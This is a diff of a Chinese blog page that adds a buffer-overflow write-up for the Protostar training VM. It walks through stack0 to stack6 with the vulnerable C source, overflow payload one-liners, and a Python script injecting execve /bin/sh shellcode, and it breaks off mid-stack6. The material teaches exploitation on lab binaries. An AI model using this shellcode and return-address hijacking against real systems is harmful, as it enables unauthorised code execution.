@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://ootyoo.github.io">
-  <title>Archives: 2019/7 | 云楼主的札记</title>
+  <title>buffer_overflow_writeup | 云楼主的札记</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="过诸世界，闻诸道理，看诸人生">
-<meta name="keywords" content="poetry,program,physics">
-<meta property="og:type" content="website">
-<meta property="og:title" content="云楼主的札记">
-<meta property="og:url" content="https://ootyoo.github.io/archives/2019/07/index.html">
+  <meta name="description" content="Buffer-Overflow Writeup1.基本介绍练习使用的镜像来自exploit-exercises中的Protostar，该镜像覆盖的练习内容包括  buffer overflows format strings  heap exploitation socket programming  镜像为linux-32bit系统，用户名密码为：user/user, root用户对应的密码为g">
+<meta name="keywords" content="hacking">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buffer_overflow_writeup">
+<meta property="og:url" content="https://ootyoo.github.io/2020/11/21/buffer-overflow-writeup/index.html">
 <meta property="og:site_name" content="云楼主的札记">
-<meta property="og:description" content="过诸世界，闻诸道理，看诸人生">
+<meta property="og:description" content="Buffer-Overflow Writeup1.基本介绍练习使用的镜像来自exploit-exercises中的Protostar，该镜像覆盖的练习内容包括  buffer overflows format strings  heap exploitation socket programming  镜像为linux-32bit系统，用户名密码为：user/user, root用户对应的密码为g">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-11-26T12:14:57.476Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="云楼主的札记">
-<meta name="twitter:description" content="过诸世界，闻诸道理，看诸人生">
+<meta name="twitter:title" content="buffer_overflow_writeup">
+<meta name="twitter:description" content="Buffer-Overflow Writeup1.基本介绍练习使用的镜像来自exploit-exercises中的Protostar，该镜像覆盖的练习内容包括  buffer overflows format strings  heap exploitation socket programming  镜像为linux-32bit系统，用户名密码为：user/user, root用户对应的密码为g">
   
     <link rel="alternative" href="/atom.xml" title="云楼主的札记" type="application/atom+xml">
   
@@ -59,7 +60,7 @@
 		<nav class="header-menu">
 			<ul>
 			
-				<li><a href="../../../index.html">主页</a></li>
+				<li><a href="../../../../index.html">主页</a></li>
 	        
 			</ul>
 		</nav>
@@ -137,7 +138,7 @@
 				<ul style="width: 50%">
 				
 				
-					<li style="width: 100%"><a href="../../../index.html">主页</a></li>
+					<li style="width: 100%"><a href="../../../../index.html">主页</a></li>
 		        
 				</ul>
 			</nav>
@@ -152,49 +153,283 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-buffer-overflow-writeup" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href=".." class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="../../../2019/07/28/hello-world/" class="archive-article-date">
-  	<time datetime="2019-07-28T09:55:47.782Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-28</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="../../../2019/07/28/hello-world/">Hello Worlds</a>
+    <h1 class="article-title" itemprop="name">
+      buffer_overflow_writeup
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href class="archive-article-date">
+  	<time datetime="2020-11-21T01:05:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Buffer-Overflow-Writeup"><a href="#Buffer-Overflow-Writeup" class="headerlink" title="Buffer-Overflow Writeup"></a>Buffer-Overflow Writeup</h1><h2 id="1-基本介绍"><a href="#1-基本介绍" class="headerlink" title="1.基本介绍"></a>1.基本介绍</h2><p>练习使用的镜像来自<a href="https://exploit-exercises.lains.space/" target="_blank" rel="noopener">exploit-exercises</a>中的Protostar，该镜像覆盖的练习内容包括</p>
+<ul>
+<li>buffer overflows</li>
+<li>format strings </li>
+<li>heap exploitation</li>
+<li>socket programming</li>
+</ul>
+<p>镜像为linux-32bit系统，用户名密码为：user/user, root用户对应的密码为godmode。使用virtualbox安装镜像时，增添虚拟网卡，配置网络环境为<strong>Host-only Adapter</strong>。对应的可执行文件位于<code>/opt/protostar/bin/</code>下。</p>
+<p>本文介绍抢两个部分</p>
+<h2 id="2-stack-overflow"><a href="#2-stack-overflow" class="headerlink" title="2.stack overflow"></a>2.stack overflow</h2><p>stack上存储的数据结构为<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HighAddr | <span class="type">[para</span>-N]...[para0]|<span class="type">[ret</span>-addr]|<span class="type">[old</span>-ebp]|<span class="type">[local</span>-var] | <span class="type">esp</span> -&gt; LowAddr</span><br></pre></td></tr></table></figure></p>
+<p>当用户使用<code>gets</code>,<code>fgets</code>等内存不安全函数获取用户输入时，用户可以覆盖掉stack中的局部变量，返回地址等关键信息，甚至注入shellcode，截取程序执行流程。</p>
+<h3 id="2-1-stack0"><a href="#2-1-stack0" class="headerlink" title="2.1 stack0"></a>2.1 stack0</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have changed the 'modified' variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again?\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键点：使用<code>gets</code>读取用户输入，当用户输入超过64时，会覆盖stack中数据，进而修改<code>modified</code>，改变程序执行流程。</p>
+<p>存储用户输入的<code>buffer</code>数组头位于local-val中，向高地址生长。变量<code>modified</code>位于其之前。</p>
+<p>solution：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*70"</span> |./stack0</span><br></pre></td></tr></table></figure>
+<h3 id="2-2-stack1"><a href="#2-2-stack1" class="headerlink" title="2.2 stack1"></a>2.2 stack1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please specify an argument\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x61626364</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly got the variable to the right value\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该比stack0更近一步，需要将<code>modified</code>变量修改为特定值，需要攻击者准确编排输入。<br>可以使用特定pattern定位。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./stack1 `python -c <span class="string">"print 'A'*64 + 'BBBB'"</span>`</span><br></pre></td></tr></table></figure>
+<p>程序回显<code>Try again, you got 0x42424242</code>,说明带修改变量在用户输入中的offset为64，我们可以将其修改为想要的值，注意采用小端表示即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./stack1 `python -c <span class="string">"print 'A'*64 + '\x64\x63\x62\x61'"</span>`</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-3-stack2"><a href="#2-3-stack2" class="headerlink" title="2.3 stack2"></a>2.3 stack2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">char</span> *variable;</span><br><span class="line"></span><br><span class="line">  variable = getenv(<span class="string">"GREENIE"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(variable == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please set the GREENIE environment variable\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, variable);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x0d0a0d0a</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly modified the variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此处向缓冲区写入的源来自环境变量，因此用户只需将恶意输入定义到环境变量即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> GREENIE=`python -c <span class="string">"print 'A'*64 + '\x0a\x0d\x0a\x0d'"</span>`</span><br><span class="line">$ ./stack2</span><br></pre></td></tr></table></figure>
+<h3 id="2-4-stack3"><a href="#2-4-stack3" class="headerlink" title="2.4 stack3"></a>2.4 stack3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">volatile</span> <span class="title">int</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  fp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fp) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);</span><br><span class="line">      fp();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此题相比于前面的不同在于，stack上的localvariable为一个函数指针，即函数的地址。需将我们希望执行的代码地址放入该localvaribale中。可以使用objdump或gdb获取<code>win</code>函数的加载地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -t stack3 | grep <span class="string">"win"</span></span><br></pre></td></tr></table></figure>
+<p>得到<code>win</code>函数地址为<code>0x08048424</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ `python -c <span class="string">"print 'A'*64 + '\x24\x84\x04\x08'"</span>` | ./stack3</span><br></pre></td></tr></table></figure>
+<h3 id="2-5-stack4"><a href="#2-5-stack4" class="headerlink" title="2.5 stack4"></a>2.5 stack4</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不同于之前的练习<em>符合某些条件时执行</em>，该题中无明显调用<code>win</code>函数的地方，需要攻击者通过劫持程序执行流进而执行目标函数。即需要攻击者将stack中存储的函数返回地址修改为<code>win</code>函数地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*76 + 'BBBB'"</span> &gt; /tmp/<span class="built_in">log</span></span><br><span class="line">$ gdb stack4</span><br><span class="line">$ ...</span><br><span class="line">$ (gdb) r &lt; /tmp/<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+<p>此时程序报错segment fault, 显示地址为<code>0x42424242</code>, 因此只需将<code>win</code>函数的值填入’BBBB’ 对应位置即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*76 + '\xf4\x83\x04\x08'"</span> | ./stack4</span><br></pre></td></tr></table></figure>
+<h3 id="2-6-stack5"><a href="#2-6-stack5" class="headerlink" title="2.6 stack5"></a>2.6 stack5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该题中无目标函数，需要攻击者将自己希望之星的代码通过输入放入stack中，并覆盖stack中存储的ip进行执行。这是典型的BoF攻击场景。题目中提到可以使用’\xcc’(int3)中段来调试恶意代码。</p>
+<p>典型的BoF传入恶意代码的目的为获取shell，因此恶意代码又被称为shellcode。shellcode可以自己编写，也可以在网上直接查找，如 <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">shellstorm</a>，在上面可以找到对应<code>linux/x86 sh</code>相关的shellcode为<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"<span class="symbol">\x</span>31<span class="symbol">\x</span>c9<span class="symbol">\x</span>f7<span class="symbol">\x</span>e1<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>51<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f"</span><br><span class="line">"<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>cd"</span><br><span class="line">"<span class="symbol">\x</span>80"</span><br></pre></td></tr></table></figure></p>
+<p>这个shellcode长度为21Byte，可以放入buffer中。接下来需要做的就是讲返回地址覆盖为buffer的地址即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: stack5.py</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">shellcode =<span class="string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">shellcode = <span class="string">"\x90"</span>*<span class="number">4</span> + shellcode</span><br><span class="line">shellcode = (shellcode + <span class="string">'\x90'</span>*<span class="number">64</span>)[:<span class="number">64</span>]</span><br><span class="line">ebp = struct.pack(<span class="string">"I"</span>,<span class="number">0x41414141</span>)</span><br><span class="line">ip  = struct.pack(<span class="string">"I"</span>,<span class="number">0x42424242</span>)</span><br><span class="line">out = shellcode + ebp + ip</span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<p>可以使用gdb在gets之后检查shellcode写入是否成功，调整padding后，使用gdb将shellcode的起始地址写入，并修改ebp的值，在gdb中看到提升执行了<code>\bin\dash</code>。但直接使用该恶意输入时，会导致segment fault。</p>
+<p>定位：shellcode是放在stack上ret之前的位置。当进入<code>\bin\dash</code>执行时，也需要使用新stack，新的stack区和shellcode区域重叠，执行时会将shellcode冲掉。因此需要调整shellcode位置，将其放在ip之后（比ip高的地址上）。调整后的shellcode为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: stack5.py</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">72</span></span><br><span class="line">shellcode =<span class="string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">shellcode = <span class="string">"\x90"</span>*<span class="number">4</span> + shellcode</span><br><span class="line">shellcode = (shellcode + <span class="string">'\x90'</span>*<span class="number">64</span>)[:<span class="number">64</span>]</span><br><span class="line">ebp = struct.pack(<span class="string">"I"</span>,<span class="number">0xbffff780</span>)</span><br><span class="line">ip  = struct.pack(<span class="string">"I"</span>,<span class="number">0xbffff7c0</span>)</span><br><span class="line">out = padding + ebp + ret + shellcode</span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<p>执行后程序正常退出，这是因为shellcode执行后进入shell，但因为缺少输入流，因此无法输入和交付。需要使用如下技巧保证pipe不会关闭，这样就可以在打开的shell中输入代码了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (python stack5.py; cat) | ./stack5</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-7-stack6"><a href="#2-7-stack6" class="headerlink" title="2.7 stack6"></a>2.7 stack6</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> <span class="function">oid <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input path please: "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  getpath();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该题目在stack5的基础上添加了对当前函数栈帧返回值的判断，要求当前返回地址不能是<code>0xbf00000000</code>区域。在gdb中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (gdb) info proc map</span><br></pre></td></tr></table></figure></p>
+<p>可以看到stack刚好位于该区域。因此该限制使得stack5的解法失效。我们不能直接跳转到shellcode区域，因此需要一块中间跳板。提升中写道可以使用ret2lib或ROP来绕过对地址的限制。我们可以使用ret指令来解决这个限制。</p>
+<p>关键点：ret指令的作用相当于将stack顶上的值弹出，然后跳转到stack执行。我们可以将跳转分为两步：</p>
+<ol>
+<li>shellcode注入后在<code>getpath</code>中执行ret，跳转到一条ret指令</li>
+<li>第二次ret时跳转到shellcode执行。</li>
+</ol>
+<p>我们需要寻找作为跳板的第二条ret指令。最简单的做法是服用<code>getpath</code>函数中的ret。</p>
